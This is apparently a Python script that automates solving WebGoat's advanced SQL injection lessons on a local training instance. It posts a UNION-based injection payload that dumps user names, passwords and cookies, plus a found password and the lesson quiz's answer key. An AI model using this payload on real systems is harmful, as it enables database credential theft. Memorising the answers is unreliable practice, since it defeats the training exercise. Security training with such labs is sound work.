import requests

class WebGoatBot:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        self.lesson = ''

    def login(self, username, password):
        login_url = self.url + '/login'
        data = {'username': username, 'password': password}

        response = self.session.post(login_url, data=data, allow_redirects=False)

        if response.status_code == 302:
            if response.headers['Location'] == self.url + '/welcome.mvc':
                return True
            else:
                return False
        else:
            return False

    def logout(self):
        logout_url = self.url + '/logout'
        # print(f"Tentative de déconnexion : {logout_url}")
        response = self.session.get(logout_url)
        if response.status_code == 200:
            return True
        else:
            return False

    def goto_lesson(self, lesson):
        response = self.session.get(self.url + lesson)
        if response.status_code == 200:
            return True
        else:
            return False

    def post_form(self, exercise, data):
        response = self.session.post(self.url + exercise, data=data)
        if response.status_code == 200:
            json_response = response.json()
            if json_response.get('lessonCompleted'):
                return True
        return False



class WebGoatBotSqlInjection(WebGoatBot):
    def __init__(self, url):
       super().__init__(url)

    def do_exercise(self, lesson, exercise, data):
        if self.goto_lesson(lesson):
            return self.post_form(exercise, data)
        else:
            return False


#  login test
if __name__ == "__main__":
    bot = WebGoatBotSqlInjection('http://127.0.0.1:8080/WebGoat')
    username = 'gaelle'
    password = 'azerty'
    lesson = '/SqlInjection.lesson'


    exercises = [
        {
            'exercise': '/SqlInjectionAdvanced/attack6a',
            'data': {
                'userid_6a': "Smith' UNION SELECT userid, user_name, password, cookie, NULL, NULL, NULL FROM user_system_data--",
            }
        },
        {
            'exercise': '/SqlInjectionAdvanced/attack6b',
            'data': {
                'userid_6b': 'passW0rD'
            }
        },
        {
            'exercise': '/SqlInjectionAdvanced/quiz',
            'data': {
                'question_0_solution': 'Solution 4: A statement has got values instead of a prepared statement',
                'question_1_solution': 'Solution 3: ?',
                'question_2_solution': 'Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.',
                'question_3_solution': 'Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.',
                'question_4_solution': "Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.",
            }
        }
    ]

    if bot.login(username, password):
        print("Connexion réussie!")

        for exercise in exercises:
            if bot.do_exercise(lesson, exercise['exercise'], exercise['data']):
                print(f"Exercice {exercise['exercise']} réussi!")
            else:
                print("Échec de l'exercice.")
    else:
        print("Échec de la connexion.")


    if bot.logout():
        print("Déconnexion réussie!")
    else:
        print("Échec de la déconnexion.")